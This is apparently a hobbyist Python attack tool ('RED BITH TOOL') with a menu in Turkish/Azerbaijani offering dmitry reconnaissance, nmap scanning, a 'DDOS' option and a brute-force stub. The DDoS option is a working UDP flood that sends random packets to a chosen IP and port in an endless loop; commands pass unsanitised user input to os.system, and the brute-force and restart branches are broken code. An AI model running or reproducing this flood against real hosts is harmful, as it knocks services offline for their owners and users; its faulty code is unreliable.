
import os
import socket
import random
import subprocess
import signal
from termcolor import colored
os.system("apt install dmitry")
os.system("apt install nmap")
os.system("clear")





# Renkli çıktılar için ANSI kaçış dizilerini tanımlayalım
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'

# Renkli bir şekilde çıktı vermek için kullanabileceğiniz bir fonksiyon
def print_colored(text, color):
    print(color + text + Colors.ENDC)





def durdur(signal, frame):
    print_colored("Program söndürülür...", Colors.YELLOW)
    os._exit(0)

# Ctrl+C sinyalini yakalamak için signal modülünü kullanıyoruz
signal.signal(signal.SIGINT, durdur)

# Programınızın geri kalan kodu
# ...

from termcolor import colored

# Birden fazla renkte metin yazdırma
metin = colored('''

 /$$$$$$$        /$$$$$$$$       /$$$$$$$ 
| $$__  $$      | $$_____/      | $$__  $$
| $$  \ $$      | $$            | $$  \ $$
| $$$$$$$/      | $$$$$         | $$  | $$
| $$__  $$      | $$__/         | $$  | $$
| $$  \ $$      | $$            | $$  | $$
| $$  | $$      | $$$$$$$$      | $$$$$$$/
|__/  |__/      |________/      |_______/ 
                                          
                                          
                                                                                                                                                                                                                                                                                                                                               
 ''', 'red') + colored('''
 
 /$$$$$$$$        /$$$$$$         /$$$$$$        /$$            
|__  $$__/       /$$__  $$       /$$__  $$      | $$            
   | $$         | $$  \ $$      | $$  \ $$      | $$            
   | $$         | $$  | $$      | $$  | $$      | $$            
   | $$         | $$  | $$      | $$  | $$      | $$            
   | $$         | $$  | $$      | $$  | $$      | $$            
   | $$         |  $$$$$$/      |  $$$$$$/      | $$$$$$$$      
   |__/          \______/        \______/       |________/  
 ''', 'green')
print(metin)
                                                                                                                                                                                                
                                                                                                                                                                                                             

print_colored("|XOS GELMİSİNİZ|", Colors.BLUE)
print_colored("|RED BITH TOOL|", Colors.RED)
print_colored("| BY RED_BITH  |", Colors.GREEN)



print_colored("""1.Hedef site haqqinda
2.port scanner
3.DDOS hucum
4.Brute-Force(reqem)
  """, Colors.YELLOW)
secim = input("Nov sec:")

if(secim == '1'):
    hedefsite = input('Hedef site adresi')
    os.system('dmitry ' + hedefsite)
elif(secim == '2'):
    hedef = input('Sayt adresi ve ya ip daxit et:')
    os.system('nmap ' + hedef)
elif(secim == '3'):
    print_colored("""
    ###########################
    #  T00L - By RED_BITH     #
    #  ATTACK- DDOS           #
    #  HUCUMA HAZIRDIR        #
    ###########################
    """, Colors.RED)
    
    hedef_ip=input("Hedef ip daxil et :")
    hedef_port=int(input("Hedef port:"))

    bytes = random._urandom(3000)
    sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    sayac = 0
    while True:
        sock.sendto(bytes , (hedef_ip,hedef_port))
        sayac=sayac+1
        print_colored("HUCUM EDILIR , gonderilen byte:%s"%(sayac) , Colors.GREEN)

elif(secim == '4'):
    main = colored("""
###############################
#  ATTACK- BRUTE FORCE!       #
#   BY RED-BITH               #
# ASAGIDAKI QAYDALARA EMEL ET #
###############################
  """, Colors.BLUE) + colored(("""1. Bu sade brute-force  toolu sadece reqemli sifre qira biler!
2.Bu sadece egitim meqsedlidir, Brute-force mentiqni qavramaginiz ucundur.""", Colors.YELLOW)"""
3. !!! Qeyri-etik olaraq YOXLAMAQ TOVSIYYE EDILMIR, sorumluluq QEBUL EDİLMİR !!!""", Colors.RED)


else:
    print_colored("----Xəta baş verdi!", Colors.RED)
    print_colored("""----Yenidən başlatma üçün : 1.
    ----Çıxış etmək üçün :2.""", Colors.YELLOW)
    secim2 = input("Qərar ver:")
    if(secim2 == '1'):
        durdur()
        os.system("python RED_TooLL.py")
    elif(secim2 == '2'):
        durdur()
    else:
        durdur()
        

    
    
        
